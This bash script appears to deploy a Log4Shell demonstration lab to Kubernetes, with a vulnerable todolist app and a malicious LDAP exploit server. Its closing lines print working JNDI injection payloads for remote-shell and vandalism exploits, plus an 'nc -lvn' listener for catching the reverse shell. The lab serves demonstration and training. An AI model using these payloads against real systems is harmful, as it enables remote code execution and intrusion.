#!/bin/bash
set -e

REPO_PROMPT="Enter the image repository name (DockerHub username or other registry) )"
if [[ -z "${REPO}" ]]; then
  read -p "${REPO_PROMPT}:" REPO_INPUT
else
  read -p "${REPO_PROMPT} [${REPO}]:" REPO_INPUT
fi
export REPO=${REPO_INPUT:-$REPO}

echo "Which Log4Shell Exploit would you like to use?"
select EXPLOIT_TYPE in "RemoteShell" "Vandalize"; do
  export EXPLOIT_TYPE
  break
done



if [[ $EXPLOIT_TYPE == "RemoteShell" ]]; then
  select REMOTE_HOST in "localhost" "rsh.smalls.xyz" "civorsh.smalls.xyz" "other"; do
    if [[ $REMOTE_HOST == "other" ]]; then
      read -p "Enter remote host to connect to: " REMOTE_HOST
    fi
    export REMOTE_HOST
    break
  done

  read -p "Enter remote port to connect to [9000]: " REMOTE_PORT  
  export REMOTE_PORT=${REMOTE_PORT:-9000}

 if [[ $1 != "build" ]]; then
    echo "NOTE: RemoteShell requires a java file to be modified."
    echo "If you are entering a new remote host/port from prior image builds, you should re-build them."
    read -p "Build images now? [y/N]: " BUILD_IMAGES_YN
  fi 

  cp todolist/exploits/log4shell-server/src/main/java/RemoteShell.java /tmp/RemoteShell.java

  # Have to set line this way because envsubst will delete it otherwise
  export line='$line'
  cat /tmp/RemoteShell.java | envsubst > todolist/exploits/log4shell-server/src/main/java/RemoteShell.java
  unset line
fi


if [[ $1 == "build" ]] || [[ $BUILD_IMAGES_YN =~ ^[Yy]$ ]]; then
  echo "Building and pushing docker images"

  #if depot is in PATH, use it, otherwise use docker
  if command -v depot >/dev/null 2>&1; then
    export IMAGE_BUILDER="depot build "
    export IMAGE_FLAGS=" --project 5024s98s0j --push --platform=linux/amd64,linux/arm64"
  elif command -v docker >/dev/null 2>&1; then
    export IMAGE_BUILDER="docker build "
    echo "Which platform would you like to build for?"
    select IMAGE_PLATORM in "linux/amd64" "linux/arm64" "both (requires buildx)"; do
      case $IMAGE_PLATORM in
        "both (requires buildx)")
          echo "Building for both platforms"
          export IMAGE_BUILDER="docker buildx build "
          export IMAGE_FLAGS=" --push --platform=linux/amd64,linux/arm64"
          break
          ;;
        *)
          echo "Building for $IMAGE_PLATORM"
          export IMAGE_FLAGS=" --platform=${IMAGE_PLATORM}"
          break
          ;;
      esac

      break
    done
  else
    echo "ERROR: Neither docker nor depot client found, exiting"
    exit 1
  fi

  echo "  ${IMAGE_BUILDER}client found, will use it to build and push images"
  echo

  $IMAGE_BUILDER -t $REPO/thumbnailer:latest thumbnailer $IMAGE_FLAGS
  $IMAGE_BUILDER -t $REPO/todolist:latest todolist $IMAGE_FLAGS
  $IMAGE_BUILDER -t $REPO/log4shell-server:latest todolist/exploits/log4shell-server $IMAGE_FLAGS

  if [[ $IMAGE_BUILDER == "docker build " ]]; then
    docker push $REPO/thumbnailer:latest
    docker push $REPO/todolist:latest
    docker push $REPO/log4shell-server:latest
  fi

  # if /tmp/RemoteShell.java exists, restore it
  if [[ -f /tmp/RemoteShell.java ]]; then
    cp /tmp/RemoteShell.java todolist/exploits/log4shell-server/src/main/java/RemoteShell.java
    rm /tmp/RemoteShell.java
  fi
fi

echo "Deploying to kubernetes"
# cat manifests/*.yaml | envsubst
cat manifests/*.yaml | envsubst | kubectl apply -f -

echo "Waiting for deployments to be ready"
kubectl wait --for=condition=available --timeout=600s deployment/todolist -n todolist
kubectl wait --for=condition=available --timeout=600s deployment/thumbnailer -n todolist
ip=""
while [[ -z $ip && -z "$lb_hostname" ]]; do
  echo "Waiting for external IP"
  ip=$(kubectl get svc todolist -n todolist --template="{{range .status.loadBalancer.ingress}}{{.ip}}{{end}}")
  lb_hostname=$(kubectl get svc todolist -n todolist -o jsonpath='{.status.loadBalancer.ingress[0].hostname}')
  [[ -z "$ip" && -z "$lb_hostname" ]] && sleep 10
done
if [[ "$lb_hostname" != "" ]]; then
  ip=$lb_hostname
fi
echo "Application appears to up and running, open http://${ip}/todolist in your browser."
echo
if [[ $EXPLOIT_TYPE == "RemoteShell" ]]; then
  echo "To exploit Log4Shell RemoteShell, run the following command on the remote host: nc -lvn ${REMOTE_PORT}"
  echo 'Log into the application and search for the following string: ${jndi:ldap://ldap.darkweb:80/#RemoteShell}'
  echo "Attempt to send commands from the nc session."
else
  echo 'To exploit Log4Shell Vandalize, log into the application and search for the following string: ${jndi:ldap://ldap.darkweb:80/#Vandalize}'
fi